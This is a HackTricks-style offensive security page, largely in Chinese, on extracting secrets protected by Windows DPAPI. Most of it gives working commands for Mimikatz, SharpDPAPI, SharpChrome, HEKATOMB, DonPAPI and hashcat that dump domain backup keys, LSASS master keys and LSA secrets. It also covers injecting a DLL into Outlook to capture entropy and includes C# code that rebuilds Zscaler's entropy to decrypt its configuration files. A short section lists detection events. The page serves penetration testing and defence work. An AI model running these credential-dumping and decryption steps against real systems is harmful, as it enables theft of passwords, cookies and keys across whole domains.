# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

Data Protection API (DPAPI) 主要在 Windows 操作系统中用于 **对非对称私钥进行对称加密**，利用用户或系统秘密作为重要的熵来源。该方法通过允许开发者使用从用户登录凭据派生的密钥来加密数据（或对于系统加密，使用系统的域身份验证秘密），简化了加密流程，从而免去了开发者自行保护加密密钥的必要。

最常见的使用 DPAPI 的方式是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数，它们允许应用在当前登录会话的进程中安全地加密和解密数据。这意味着被加密的数据只能由加密它的相同用户或系统解密。

此外，这些函数还接受一个 **`entropy` parameter**，该参数在加密和解密时也会被使用，因此，为了解密使用该参数加密的内容，你必须提供在加密时使用的相同 entropy 值。

### Users key generation

DPAPI 为每个用户生成一个唯一密钥（称为 **`pre-key`**），基于他们的凭据生成。这个密钥由用户的密码和其他因素派生，具体算法依用户类型而异，但最终是一个 SHA1。例如，对于域用户，**它依赖于用户的 NTLM 哈希**。

这非常有意思，因为如果攻击者能够获得用户的密码哈希，他们可以：

- **使用该用户的密钥解密任何用 DPAPI 加密的数据**，而无需联系任何 API
- 离线尝试 **破解密码**，以生成有效的 DPAPI 密钥

此外，每次用户使用 DPAPI 加密某些数据时，都会生成一个新的 **master key**。这个 master key 实际上用于加密数据。每个 master key 都有一个用于识别它的 **GUID**（全局唯一标识符）。

master keys 存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的 Security Identifier。master key 是使用用户的 **`pre-key`** 加密存储的，同时也由一个用于恢复的 **域备份密钥（domain backup key）** 加密（因此相同的密钥以两种不同方式被加密存储）。

注意，用于加密 master key 的 **域密钥存在于域控制器中且从不更改**，因此如果攻击者能够访问域控制器，他们可以检索域备份密钥并解密域内所有用户的 master keys。

被加密的 blob 在其头部包含用于加密其中数据的 **master key 的 GUID**。

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### 机器/系统密钥生成

这是用来让机器加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户才能访问的特殊密钥。该密钥用于加密需要系统自身访问的数据，例如机器级凭据或系统范围的机密。

注意这些密钥**没有域备份**，因此只能在本地访问：

- **Mimikatz** 可以通过转储 LSA secrets 来访问它，使用命令：`mimikatz lsadump::secrets`
- 该 secret 存储在注册表中，因此管理员可以通过**修改 DACL 权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### 由 DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码及自动完成数据
- Outlook 和 Windows Mail 等应用的电子邮件和内部 FTP 账户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和认证目的的私钥
- 由 Credential Manager 管理的网络密码以及使用 CryptProtectData 的应用（如 Skype、MSN messenger 等）中的个人数据
- 注册表中的加密 blob
- ...

系统级被保护的数据包括：
- Wifi 密码
- 计划任务密码
- ...

### 主密钥提取选项

- 如果用户拥有域管理员权限，他们可以访问 **domain backup key** 来解密域中所有用户的主密钥：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- With local admin privileges, 可以**访问 LSASS memory**以提取所有已登录用户的 DPAPI master keys 和 SYSTEM key。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户具有本地管理员权限，他们可以访问 **DPAPI_SYSTEM LSA secret** 来解密机器主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知该用户的 password 或 hash NTLM，你可以 **直接解密该用户的主密钥**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你以该用户的会话身份登录，有可能向 DC 请求 **backup key to decrypt the master keys using RPC**。如果你是 local admin 且该用户已登录，你可以为此 **steal his session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见用户**受保护的文件**位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也可尝试将上述路径中的 `\Roaming\` 更改为 `\Local\`。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中查找 DPAPI 加密的 blobs：
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
请注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自相同的仓库）可用于使用 DPAPI 解密敏感数据，如 cookies。

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话的 DPAPI 加密文件中获取凭证：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取凭证信息**，例如加密数据和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

使用 RPC 解密请求 **domain backup key** 的用户的 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** 工具还支持用于 masterkey 解密的这些参数（注意可以使用 `/rpc` 获取域的备份密钥、使用 `/password` 提供明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** 工具还支持用于解密 `credentials|vaults|rdg|keepass|triage|blob|ps` 的这些参数（注意可以使用 `/rpc` 获取域的备份密钥，`/password` 使用明文密码，`/pvk` 指定 DPAPI 域私钥文件，`/unprotect` 使用当前用户会话...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 使用 **当前用户会话** 解密某些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### 处理可选熵（"Third-party entropy"）

一些应用程序会向 `CryptProtectData` 传递一个额外的 **entropy** 值。没有该值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭据（例如 Microsoft Outlook、某些 VPN 客户端）时，获取 entropy 至关重要。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) 是一个 user-mode DLL，会 hook 目标进程内的 DPAPI 函数，并透明地记录任何提供的可选 entropy。在 **DLL-injection** 模式下对诸如 `outlook.exe` 或 `vpnclient.exe` 的进程运行 EntropyCapture，会输出一个文件，将每个 entropy 缓冲区映射到调用进程和 blob。捕获到的 entropy 之后可以提供给 **SharpDPAPI** (`/entropy:`) 或 **Mimikatz** (`/entropy:<file>`)，以便解密数据。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 离线破解 masterkeys (Hashcat & DPAPISnoop)

Microsoft 在 Windows 10 v1607 (2016) 开始引入了 **context 3** masterkey 格式。`hashcat` v6.2.6 (2023 年 12 月) 添加了哈希模式 **22100**（DPAPI masterkey v1 context）、**22101**（context 1）和 **22102**（context 3），允许直接从 masterkey 文件对用户密码进行 GPU 加速破解。 因此，攻击者可以在不与目标系统交互的情况下执行字典或暴力破解攻击。

`DPAPISnoop` (2024) 自动化此流程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential 和 Vault blobs，使用 cracked keys 对其解密并导出 cleartext passwords。

### 访问其他机器数据

在 **SharpDPAPI and SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然你需要能够访问该机器，在下面的示例中假设已知 **domain backup encryption key**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动化工具，用于从 LDAP 目录中提取所有用户和计算机，以及通过 RPC 提取域控制器的备份密钥。脚本随后会解析所有计算机的 IP 地址，并对所有计算机执行 smbclient 以检索所有用户的 DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

从 LDAP 提取的计算机列表可以让你找到每个子网，即使你事先并不知道它们！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储由 DPAPI 保护的秘密。2.x 版本引入了：

* 从数百个主机并行收集 blobs
* 解析 **context 3** masterkeys 并自动集成 Hashcat 破解
* 支持 Chrome "App-Bound" 加密 cookies（见下一节）
* 新的 **`--snapshot`** 模式，用于重复轮询端点并对比新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault 文件的 C# 解析器，能够输出 Hashcat/JtR 格式并可选地自动调用破解。它完全支持直到 Windows 11 24H1 的机器和用户 masterkey 格式。


## Common detections

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他与 DPAPI 相关的目录。
- 尤其是通过诸如 **C$** 或 **ADMIN$** 的网络共享访问时。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似工具访问 LSASS 内存或转储 masterkeys。
- 事件 **4662**：*An operation was performed on an object* — 可与访问 **`BCKUPKEY`** 对象相关联。
- 事件 **4673/4674**：当进程请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时。

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。具有网络访问权限的攻击者可以欺骗域成员检索恶意的 DPAPI 备份密钥，从而解密用户 masterkeys。已在 2023 年 11 月的累积更新中修补——管理员应确保 DC 和工作站已完全打补丁。
* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）用存储在用户 **Credential Manager** 下的额外密钥替换了仅依赖 DPAPI 的旧保护。离线解密 cookies 现在需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在以用户上下文运行时能够恢复该额外密钥。


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector 在 `C:\ProgramData\Zscaler` 下存储了若干配置文件（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个文件都使用 **DPAPI (Machine scope)** 加密，但厂商提供了在运行时 *计算* 而非存盘的 **custom entropy**。

该 entropy 由两个元素重建：

1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码秘密。
2. 属于该配置的 Windows 帐户的 **SID**。

DLL 实现的算法等价于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
因为该秘密嵌入在可以从磁盘读取的 DLL 中，**任何具有 SYSTEM 权限的本地攻击者都可以为任意 SID 重新生成 entropy** 并离线解密这些 blobs：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
解密会产出完整的 JSON 配置，包括每一个 **device posture check** 及其预期值 —— 这在尝试客户端绕过时非常有价值。

> 提示：其他加密的文件 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) 使用 DPAPI **没有** entropy（`16` 个零字节）保护。因此一旦获得 SYSTEM 权限，就可以直接用 `ProtectedData.Unprotect` 解密。

## 参考资料

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
